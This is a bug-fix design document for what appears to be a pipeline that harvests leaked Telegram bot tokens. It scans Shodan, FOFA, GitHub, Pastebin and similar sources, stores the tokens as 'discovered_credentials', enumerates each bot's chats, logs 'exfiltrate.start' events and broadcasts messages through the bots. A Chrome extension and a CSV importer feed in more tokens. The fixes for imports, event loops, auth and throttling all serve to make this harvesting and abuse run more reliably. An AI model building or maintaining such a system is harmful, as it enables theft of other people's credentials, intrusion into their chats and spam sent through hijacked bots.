# Design Document (Revised — Full Scope)

**Generated:** 2026-04-21  
**Scope:** All 27 items from bugfix.md — no deferrals  
**Principle:** Minimum viable change. Preserve existing architecture and style.

---

## 1. Architecture Overview (Current State)

```
[Chrome Extension]
       │ direct Supabase write (x-extension-secret) — RAW TOKEN (BUG-006)
       ▼
[FastAPI API Service]
       │
       ├── /health/*     → health.py
       ├── /monitor/*    → monitor.py  (BUG-005: auth bypass)
       ├── /scan/trigger → scan.py     (BUG-013: invalid sources)
       └── /ingest/*     → ingest.py

[Celery Beat] → schedules 25+ tasks
       │
       ├── worker-scanners (Q: scanners)
       │     └── scanner_tasks.py     (BUG-001: bad import, BUG-002: missing instance)
       │                              (BUG-010: unbounded requeue)
       │
       ├── worker-core (Q: celery)
       │     └── flow_tasks.py        (BUG-003: missing method, BUG-004: meta overwrite)
       │                              (BUG-008: asyncio.run, BUG-009: limit 20)
       │                              (BUG-011: broadcaster singleton)
       │     └── audit_tasks.py       (BUG-007: sync DB calls)
       │
       └── worker-scrape (Q: scrape)
             └── flow_tasks.py

[Bot Service] → bot_listener.py       (BUG-014: LOCK_TTL redefinition)

[Supabase] ← all workers read/write via service role key
[Redis]    ← broker, locks, cooldowns, counters
           (BUG-016: circuit breaker thresholds)
```

---

## 2. Fix Designs

---

### 2.1 Import Fixes (BUG-001, BUG-002)

**BUG-001 — GithubGistService import**

`GithubGistService` is defined in `scanners_extension.py` but imported from `scanners.py`.

```python
# scanner_tasks.py — Before
from app.services.scanners import (
    FofaService, GithubGistService, GithubService, GitlabService,
    GrepAppService, PastebinService, SerperService, ShodanService, UrlScanService,
)
from app.services.scanners_extension import GoogleSearchService, BitbucketService, NetlasService

# After
from app.services.scanners import (
    FofaService, GithubService, GitlabService,
    GrepAppService, PastebinService, SerperService, ShodanService, UrlScanService,
)
from app.services.scanners_extension import (
    GoogleSearchService, BitbucketService, NetlasService,
    GithubGistService, PublicWwwService,   # BUG-002 also resolved here
)
```

**BUG-002 — PublicWwwService not instantiated**

Add after existing service instantiations:
```python
publicwww_srv = PublicWwwService()
```

---

### 2.2 AuditLogger Method Fix (BUG-003)

`AuditLogger` has only a static `log()` method. `flow_tasks.py` calls `log_event()`.

Replace both call sites:
```python
# Before
audit_log = AuditLogger()
audit_log.log_event("exfiltrate.start", {"cred_id": cred_id})

# After
AuditLogger.log(
    event_type="exfiltrate.start",
    credential_id=cred_id,
    details={"cred_id": cred_id}
)
```

Remove `audit_log = AuditLogger()` instantiation lines. Use static method directly.

---

### 2.3 Monitor Auth Fix (BUG-005, BUG-015)

FastAPI maps `x_monitor_key` → `X-Monitor-Key` header automatically.

```python
# monitor.py — Before
@router.get("/stats", response_model=StatsOut)
async def get_stats(_auth: None = Header(None, alias="X-Monitor-Key")):
    if settings.MONITOR_API_KEY:
        if _auth != settings.MONITOR_API_KEY:

# After
@router.get("/stats", response_model=StatsOut)
async def get_stats(x_monitor_key: str | None = Header(None)):
    if settings.MONITOR_API_KEY:
        if x_monitor_key != settings.MONITOR_API_KEY:
```

Also remove the dead `_verify_monitor_auth()` helper function.

---

### 2.4 Multi-Chat Meta Overwrite Fix (BUG-004)

The second `update()` in `_enrich_logic` replaces the entire `meta` dict, losing `topic_id`.

```python
# flow_tasks.py — Before (second update for multi-chat case)
await async_execute(db.table("discovered_credentials").update({
    "meta": {
        "chat_name": first_chat["name"],
        "type": first_chat["type"],
        "enriched": True,
        "all_chats": all_chat_ids
    }
}).eq("id", cred_id))

# After — preserve topic_id and bot info
await async_execute(db.table("discovered_credentials").update({
    "meta": {
        "chat_name": first_chat["name"],
        "type": first_chat["type"],
        "enriched": True,
        "all_chats": all_chat_ids,
        "topic_id": topic_id,
        "bot_username": bot_username,
        "bot_id": bot_id,
    }
}).eq("id", cred_id))
```

---

### 2.5 Async DB Calls in Audit Tasks (BUG-007)

Import `async_execute` from `flow_tasks` and wrap all synchronous DB calls.

```python
# audit_tasks.py — add import
from app.workers.tasks.flow_tasks import async_execute

# Replace all direct .execute() calls in async functions:
# Before
response = db.table("discovered_credentials").select(...).execute()
# After
response = await async_execute(db.table("discovered_credentials").select(...))
```

Affected functions: `_audit_active_topics_async()`, `_system_self_heal_async()`

---

### 2.6 Persistent Event Loop — asyncio.run() Fix (BUG-008)

**Problem:** Every Celery task calls `asyncio.run()` which creates a new event loop. This:
- Breaks `asyncio.Lock` objects created at import time (wrong loop)
- Creates/destroys Telethon connections on every task
- Defeats `BotClientManager` pooling

**Solution:** Use Celery worker signals to create one persistent event loop per worker process. Store it in a module-level variable. Replace `asyncio.run()` with `get_event_loop().run_until_complete()`.

```python
# app/workers/celery_app.py — add after existing signal handlers

import asyncio as _asyncio

_worker_loop: _asyncio.AbstractEventLoop | None = None

def get_worker_loop() -> _asyncio.AbstractEventLoop:
    """Returns the persistent event loop for this worker process."""
    global _worker_loop
    if _worker_loop is None or _worker_loop.is_closed():
        _worker_loop = _asyncio.new_event_loop()
        _asyncio.set_event_loop(_worker_loop)
    return _worker_loop

@worker_ready.connect
def on_worker_ready(**kwargs):
    get_worker_loop()  # Initialize loop on worker startup
    _send_signal_log("🟢 **Worker Service** Started (Celery)")

@worker_shutdown.connect
def on_worker_shutdown(**kwargs):
    _send_signal_log("🔴 **Worker Service** Stopping...")
    global _worker_loop
    if _worker_loop and not _worker_loop.is_closed():
        _worker_loop.close()
```

Then in all task files, replace the `_run_sync` helper:
```python
# Before (in scanner_tasks.py, flow_tasks.py, audit_tasks.py)
def _run_sync(coro):
    return asyncio.run(coro)

# After
def _run_sync(coro):
    from app.workers.celery_app import get_worker_loop
    loop = get_worker_loop()
    return loop.run_until_complete(coro)
```

This is a 3-file change to `_run_sync` plus additions to `celery_app.py`. No task logic changes required.

**Note on BotClientManager:** The `asyncio.Lock()` in `BotClientManager.__init__` is created at import time. With a persistent loop, this lock will belong to the correct loop. No changes needed to `bot_manager_srv.py`.

---

### 2.7 BroadcasterService Singleton (BUG-011)

**Problem:** `BroadcasterService()` instantiated inside every async function. `itertools.cycle` state lost between calls.

**Solution:** Create module-level singleton in `flow_tasks.py`. Lazy-initialize to avoid import-time issues.

```python
# flow_tasks.py — add near top, after imports
_broadcaster: "BroadcasterService | None" = None

def get_broadcaster() -> "BroadcasterService":
    """Returns the module-level BroadcasterService singleton."""
    global _broadcaster
    if _broadcaster is None:
        from app.services.broadcaster_srv import BroadcasterService
        _broadcaster = BroadcasterService()
    return _broadcaster
```

Replace all `BroadcasterService()` instantiations in `flow_tasks.py` with `get_broadcaster()`.

Do the same in `scanner_tasks.py` and `audit_tasks.py` — they can import `get_broadcaster` from `flow_tasks`:
```python
from app.workers.tasks.flow_tasks import async_execute, get_broadcaster
```

---

### 2.8 Raw Token Encryption in Extension (BUG-006)

**Problem:** Extension writes `bot_token: token` (plaintext) to Supabase. Backend self-heals on first use but a window exists.

**Solution:** Encrypt the token client-side in `background.js` using the Web Crypto API (AES-GCM) before writing to Supabase. The backend already handles the Fernet self-heal path for non-`gAAAA` prefixed values — we need a different approach since the extension cannot use Fernet.

**Revised approach:** Mark extension-written tokens with a sentinel prefix `RAW:` so the backend can identify and immediately encrypt them. This is simpler than implementing Fernet in JS and maintains the existing self-heal path.

Actually, the cleanest solution that requires no crypto in JS: **route extension writes through the `/ingest/extension/credentials` API endpoint** which already exists and encrypts server-side. The extension already has the API URL configured.

```javascript
// background.js — uploadToSupabase()
// Before: direct Supabase REST write
// After: POST to /ingest/extension/credentials

async function uploadToSupabase() {
    // ... existing validation ...
    
    const cfg = await new Promise((resolve) => {
        chrome.storage.sync.get(["supabase_config"], (r) => resolve(r.supabase_config || {}));
    });

    const apiUrl = (cfg.apiUrl || "").trim().replace(/\/+$/, "");  // New config field
    
    if (!apiUrl) {
        // Fallback to direct write if no API URL configured
        return uploadDirectToSupabase(cfg, validResults);
    }
    
    // Route through API for server-side encryption
    const payload = {
        source: "extension",
        domain: state.domain,
        query: state.query,
        results: validResults.map(r => ({
            token: r.token,
            chat_id: r.chatId || null,
            chat_name: r.chatTitle || null,
            chat_type: r.chatType || null,
            bot_id: r.bot_id || null,
            bot_username: r.bot_name || null,
            valid: r.valid,
        }))
    };
    
    const res = await fetch(`${apiUrl}/ingest/extension/credentials`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
    // ... handle response ...
}
```

Add `apiUrl` to the extension settings popup. Keep direct Supabase write as fallback for users who don't configure the API URL.

---

### 2.9 Circuit Breaker Threshold Fix (BUG-016)

Update global circuit breakers to match PRD specification:

```python
# circuit_breaker.py — Before
_circuit_breakers = {
    "shodan": CircuitBreaker("shodan", failure_threshold=3, recovery_timeout=300),
    "urlscan": CircuitBreaker("urlscan", failure_threshold=3, recovery_timeout=300),
    "github": CircuitBreaker("github", failure_threshold=3, recovery_timeout=300),
    "fofa": CircuitBreaker("fofa", failure_threshold=3, recovery_timeout=300),
}

# After — match PRD: threshold=5, recovery=60s
_circuit_breakers = {
    "shodan": CircuitBreaker("shodan", failure_threshold=5, recovery_timeout=60),
    "urlscan": CircuitBreaker("urlscan", failure_threshold=5, recovery_timeout=60),
    "github": CircuitBreaker("github", failure_threshold=5, recovery_timeout=60),
    "fofa": CircuitBreaker("fofa", failure_threshold=5, recovery_timeout=60),
}
```

Also update `get_circuit_breaker()` default values to match:
```python
_circuit_breakers[service_name] = CircuitBreaker(
    service_name,
    failure_threshold=5,
    recovery_timeout=60
)
```

---

### 2.10 CSV Import Pipeline (MISSING-001)

**New Celery task:** `system.import_csv`

**Flow:**
1. Scan `imports/` for `.csv` files
2. Parse each file (columns: `token`, `chat_id`)
3. Validate token format
4. Insert to `discovered_credentials` via existing `_save_credentials_async` pattern
5. Rename file to `.processed` (or move to `imports/processed/`)

**Task registration:** Add to `celery_app.py` beat schedule (run every 5 minutes).

**New file:** `app/workers/tasks/import_tasks.py`

```python
@app.task(name="system.import_csv")
def import_csv():
    return _run_sync(_import_csv_logic())

async def _import_csv_logic():
    import csv, os, glob
    from pathlib import Path
    
    imports_dir = Path("/app/imports")
    csv_files = list(imports_dir.glob("*.csv"))
    
    if not csv_files:
        return "No CSV files to import."
    
    total_imported = 0
    for csv_path in csv_files:
        # Rename to .pending immediately to claim the file
        pending_path = csv_path.with_suffix(".pending")
        csv_path.rename(pending_path)
        
        results = []
        try:
            with open(pending_path, newline="", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    token = (row.get("token") or "").strip()
                    chat_id = row.get("chat_id") or None
                    if token:
                        results.append({"token": token, "chat_id": chat_id, "meta": {}})
        except Exception as e:
            logger.error(f"[CSV Import] Failed to read {pending_path}: {e}")
            continue
        
        if results:
            from app.workers.tasks.scanner_tasks import _save_credentials_async
            saved = await _save_credentials_async(results, "csv_import")
            total_imported += saved
        
        # Move to processed
        processed_dir = imports_dir / "processed"
        processed_dir.mkdir(exist_ok=True)
        pending_path.rename(processed_dir / pending_path.name)
    
    return f"CSV import complete. Imported {total_imported} credentials from {len(csv_files)} file(s)."
```

**Beat schedule entry:**
```python
"import-csv-5min": {
    "task": "system.import_csv",
    "schedule": crontab(minute="*/5"),
},
```

---

### 2.11 Audit DB Persistence (MISSING-002)

**New table in `database/init.sql`:**

```sql
CREATE TABLE IF NOT EXISTS audit_logs (
    id          UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    timestamp   TIMESTAMPTZ DEFAULT NOW(),
    event_type  TEXT        NOT NULL,
    credential_id UUID      REFERENCES discovered_credentials(id) ON DELETE SET NULL,
    user_agent  TEXT        DEFAULT 'system',
    success     BOOLEAN     DEFAULT TRUE,
    details     JSONB       DEFAULT '{}'::jsonb
);

CREATE INDEX IF NOT EXISTS idx_audit_event_type ON audit_logs(event_type);
CREATE INDEX IF NOT EXISTS idx_audit_timestamp  ON audit_logs(timestamp);
```

**Implement `_persist_to_db()` in `audit.py`:**

```python
@staticmethod
def _persist_to_db(audit_entry: dict):
    """Persist audit log to database."""
    try:
        db.table("audit_logs").insert({
            "event_type": audit_entry["event_type"],
            "credential_id": audit_entry.get("credential_id"),
            "user_agent": audit_entry.get("user", "system"),
            "success": audit_entry.get("success", True),
            "details": audit_entry.get("details", {}),
        }).execute()
    except Exception as e:
        logger.error(f"Audit DB persist failed: {e}")
```

---

### 2.12 Remaining Fixes (BUG-009, BUG-010, BUG-012, BUG-013, BUG-014)

**BUG-009 — Broadcast limit:** Change `.limit(20)` to `.limit(100)` in `_broadcast_logic`.

**BUG-010 — Enrichment requeue cooldown:**
```python
from app.core.redis_srv import redis_srv
cooldown_key = f"enrich_requeue:{existing_id}"
if not redis_srv.is_on_cooldown(cooldown_key):
    enrich_credential.delay(existing_id)
    redis_srv.set_cooldown(cooldown_key, 3600)
```

**BUG-012 — Token length standardization:** Change `helpers.py` to `len(secret) != 35`.

**BUG-013 — /scan/trigger sources:** Remove `censys`, `hybrid`. Add `gitlab`, `urlscan`.

**BUG-014 — LOCK_TTL redefinition:** Remove `LOCK_TTL_SECONDS = 120` from `bot_listener.py`.

---

### 2.13 Documentation Updates (CONFIG-001 through CONFIG-004)

**`.env.template`:** Add:
- `EXTENSION_WRITE_SECRET` — required for Chrome extension RLS
- `BITBUCKET_API_TOKEN` — replaces `BITBUCKET_APP_PASSWORD`
- `NETLAS_API_KEY_1` / `NETLAS_API_KEY_2`
- `TARGET_COUNTRIES` — optional, has defaults

**`README.md`:** Update scanner key table, optional variables table, and `/scan/trigger` usage section.

---

## 3. New File: app/workers/tasks/import_tasks.py

This is the only net-new file in this cycle. All other changes are modifications to existing files.

---

## 4. Database Schema Change

`database/init.sql` gains one new table: `audit_logs`. The change is additive and idempotent (`IF NOT EXISTS`). No existing tables modified.

---

## 5. Dependency Verification

| Fix | New Dependency | Status |
|---|---|---|
| BUG-001/002 | None — existing modules | ✅ |
| BUG-003 | None — existing method | ✅ |
| BUG-005/015 | None — FastAPI Header | ✅ |
| BUG-006 | None — uses existing `/ingest` endpoint | ✅ |
| BUG-007 | `async_execute` from flow_tasks | ✅ Import only |
| BUG-008 | None — stdlib asyncio | ✅ |
| BUG-009 | None | ✅ |
| BUG-010 | `redis_srv` already in scope | ✅ |
| BUG-011 | None — lazy singleton pattern | ✅ |
| BUG-012 | None | ✅ |
| BUG-013 | None | ✅ |
| BUG-014 | None | ✅ |
| BUG-016 | None | ✅ |
| MISSING-001 | `csv` stdlib, `pathlib` stdlib | ✅ |
| MISSING-002 | None — existing `db` client | ✅ |

**No new pip packages required.**

---

## 6. Risk Assessment

| Fix | Risk | Mitigation |
|---|---|---|
| BUG-008 | Medium — changes task execution model | `loop.run_until_complete()` is well-established Celery pattern. Persistent loop tested via `worker_ready` signal. |
| BUG-011 | Low — singleton pattern | Lazy init avoids import-time issues. Thread-safe for single-process workers. |
| BUG-006 | Low — adds API routing option | Direct Supabase write kept as fallback. No breaking change. |
| BUG-016 | Low — threshold increase | More lenient (5 vs 3) reduces false positives. Longer recovery (60s vs 300s) means faster recovery. |
| MISSING-001 | Low — new task, no existing code changed | File rename to `.pending` is atomic claim. Processed dir created if absent. |
| MISSING-002 | Low — additive DB change | `IF NOT EXISTS` guard. No existing tables touched. |
| BUG-007 | Medium — async wrapping in audit | Circular import risk: `audit_tasks` imports from `flow_tasks`. Verified: `flow_tasks` does not import from `audit_tasks`. Safe. |

---

## 7. Execution Order Rationale

Tasks are ordered to fix startup crashes first, then security, then data integrity, then architecture, then features, then docs. This ensures each batch leaves the system in a runnable state.
